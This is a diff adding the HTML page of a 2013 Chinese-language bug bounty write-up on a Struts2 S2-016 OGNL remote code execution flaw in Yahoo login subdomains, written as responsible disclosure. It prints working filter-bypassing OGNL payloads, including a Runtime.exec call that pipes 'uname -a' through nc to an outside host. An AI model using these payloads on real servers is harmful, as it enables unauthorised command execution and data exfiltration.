@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Yahoo 系列的 Part 2 來囉～ Bug Bounty 緣起說明以及 Part 1 請看以下鏈結  Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞  這次比較有趣，是遠端代碼執行！ 有漏洞的點主要在下面兩個網站：  b.login.yahoo.comapt.login.yahoo.com  讓我們來看看網頁長什麼樣子! apt 似乎是 Ya">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yahoo Bug Bounty Part 2 - *.login.yahoo.com Remote Code Execution 遠端代碼執行漏洞">
+<meta property="og:url" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="Yahoo 系列的 Part 2 來囉～ Bug Bounty 緣起說明以及 Part 1 請看以下鏈結  Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞  這次比較有趣，是遠端代碼執行！ 有漏洞的點主要在下面兩個網站：  b.login.yahoo.comapt.login.yahoo.com  讓我們來看看網頁長什麼樣子! apt 似乎是 Ya">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/c2f810be33abf3cc-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/43f60b50fd4615f5-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/abfb44562c75bca7-03.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/a1f7b69bec493a98-04.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/7a2d70661086bf1c-05.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/c9cab221c1d4acc3-06.png">
+<meta property="article:published_time" content="2013-11-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-20T21:58:11.100Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/c2f810be33abf3cc-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Yahoo Bug Bounty Part 2 - *.login.yahoo.com Remote Code Execution 遠端代碼執行漏洞 | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Yahoo Bug Bounty Part 2 - *.login.yahoo.com Remote Code Execution 遠端代碼執行漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2013-11-03T16:00:00.000Z" class="dt-published" itemprop="datePublished">2013-11-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Yahoo 系列的 Part 2 來囉～ Bug Bounty 緣起說明以及 Part 1 請看以下鏈結</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://orange-tw.blogspot.tw/2013/11/yahoo-bug-bounty-part-1-yahoo-blog.html">Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞</a></p>
+</blockquote>
+<p>這次比較有趣，是遠端代碼執行！ 有漏洞的點主要在下面兩個網站：</p>
+<blockquote>
+<p>b.login.yahoo.com<br>apt.login.yahoo.com</p>
+</blockquote>
+<p>讓我們來看看網頁長什麼樣子! apt 似乎是 Yahoo 的線上廣告管理系統，</p>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/c2f810be33abf3cc-01.png"></p>
+<p>b 就看不出是什麼東西了XD</p>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/43f60b50fd4615f5-02.png"></p>
+<p>出問題的原因在於這兩個網站撰寫時是使用了 Struts2 這個 Java Framework，今年七月中的時，Struts2 爆發一個嚴重的 Remote Code Execution 等級的漏洞，這個漏洞被官方編號為 <a target="_blank" rel="noopener" href="https://struts.apache.org/release/2.3.x/docs/s2-016.html">s2-016</a>（基本上 Struts2 可以出包的地方都出過一遍了之後再出事應該也不意外…），大致是說在 Struts2 中支援一些 Prefix 讓程式開發人員可以方便導向如 <code>action</code>, <code>redirect</code>, <code>redirectAction</code> 等，但在處理這些方法時並沒有做好過濾，造成在這之中的內容可以用 <code>${ognl_exp}</code> 的形式來執行 OGNL 如：</p>
+<blockquote>
+<p>redirectAction: ${123*123}</p>
+</blockquote>
+<p>網站會跳轉到 <code>/15129.action</code>，漏洞存在代表 <code>123*123</code> 有被伺服器運算到！</p>
+<p>好玩的是，官方公佈漏洞時順便把攻擊 PoC 一起釋出，等於駭客可以不用再去注意漏洞發生細節在那，可以直接開始修改 Poc 並且攻擊，那個時期網路上風雲變色，一堆網站都來不及修補深受其害xDD</p>
+<p>那時大陸著名漏洞回報網站 <a target="_blank" rel="noopener" href="http://www.wooyun.org/">烏雲</a> 上也一堆人在利用這個弱點洗 Rank 還滿有趣的xDD</p>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/abfb44562c75bca7-03.png"></p>
+<p>在用剛剛的方法判斷 Yahoo 存在這個漏洞後，接著就是嘗試使用攻擊代碼嘗試執行指令，但攻擊的 Exploit 卻不能直接利用（想想也是拉，不然早就被一堆人玩到爆了XD），所以不能利用的原因在哪裡呢？接下來就是研究的部分，</p>
+<p>來感嘆一下XD 很多 Script Kiddie 只會用網路上現成的工具入侵，但如果不確實明白原理的話很常會出現漏洞存在但工具無法使用的情況，例如 Library 路徑的不同，網路上工具都是寫死的如</p>
+<blockquote>
+<p>com.opensymphony.xwork2</p>
+</blockquote>
+<p>這樣只要路徑不再預設位置上的話工具就會失敗</p>
+<p>那要怎麼辦呢？來講個小技巧，在無法判斷位置的情況下可以利用 <code>#request</code> 這個變數來看位置以及一些敏感資訊，以這個例子來講：</p>
+<blockquote>
+<p>redirect: ${#request}</p>
+</blockquote>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/a1f7b69bec493a98-04.png"></p>
+<p>可以看到網站轉址的地方就是 #request 變數的內容（看一堆東西噴出來還滿有成就感的cc），從這裡可以看到位置是預設的沒錯，還有一些敏感資訊可以記著說不定以後會用到：Ｐ</p>
+<p>在測試的過程中發現有特定的 pattern 會造成 Exploit 失敗，猜測在伺服器上似乎有 Filter 或是一些其他的設定，造成 Exploit 失敗，所以勢必得找到那些 patttern 繞過它！！</p>
+<p>不過好在利用的是 s2-16 redirect 弱點，可以由轉址的方式來 leakge 出一些資訊判斷 Java Code 是否執行成功，所以雖然是用黑盒但可以用 Blind 的方式來進行猜測，</p>
+<p>Blind 測試後發現 patterns 好像有（並不完全）</p>
+<ol>
+<li>不能有逗點後的 method</li>
+<li>不能有雙引號</li>
+<li>不能有些特定關鍵字</li>
+</ol>
+<p>所以我們要只要繞過這些限制便可以透過去執行 Java Code 的！</p>
+<p>所以最後是透過改寫 s2-016 繞過這些 patterns 以及 OGNL Static Method 的方式來執行指令。 最後的 PoC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redirect: $&#123;</span><br><span class="line">#\_memberAccess.allowStaticMethodAccess%3dtrue,</span><br><span class="line">#context[#parameters.aa]%3dfalse,</span><br><span class="line">#\_memberAccess.excludeProperties%3d@java.util.Collections@EMPTY\_SET, </span><br><span class="line">@java.lang.Thread@sleep(10000)</span><br><span class="line">&#125;</span><br><span class="line">&amp;aa=xwork.MethodAccessor.denyMethodExecution</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/7a2d70661086bf1c-05.png"></p>
+<p>可以讓伺服器睡十秒（Total Duration 那欄可以看到超過 10000 ms）</p>
+<p>接著是執行系統指令的部分，不過那時也凌晨三四點了，想睡覺懶得踹直接硬來把指令結果反連到自己伺服器上代表系統命令有執行成功就好XD</p>
+<p>執行 uname -a 指令並且將結果傳回至我的伺服器上，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">redirect: $&#123;</span><br><span class="line">#\_memberAccess.allowStaticMethodAccess%3dtrue,</span><br><span class="line">#context[#parameters.aa]%3dfalse,</span><br><span class="line">#\_memberAccess.excludeProperties%3d@java.util.Collections@EMPTY\_SET,</span><br><span class="line">@java.lang.Runtime@getRuntime().exec(new java.lang.String[]&#123;#parameters.a1,#parameters.a2,#parameters.a3&#125;),</span><br><span class="line">&#125;</span><br><span class="line">&amp;aa=xwork.MethodAccessor.denyMethodExecution</span><br><span class="line">&amp;a1=/bin/sh</span><br><span class="line">&amp;a2=-c</span><br><span class="line">&amp;a3=uname -a | nc orange.tw 12345</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-2-loginyahoocom/c9cab221c1d4acc3-06.png"></p>
+<p>耶結案，&lt;(￣︶￣)&gt;</p>
+<p>Yahoo 系列應該到此結束吧！真的是一個滿有趣的體驗的！而且 Yahoo 給的獎金真的滿有誠意的！！！XD（只是領的方式比較繁瑣 &#x3D;_&#x3D;）</p>
+<p>有機會的話以後可以來嘗試當個獎金獵人XD</p>
+<p>最後附上個 <a target="_blank" rel="noopener" href="https://bugcrowd.com/list-of-bug-bounty-programs/">The Bug Bounty List</a> 給有興趣的人參考：）</p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
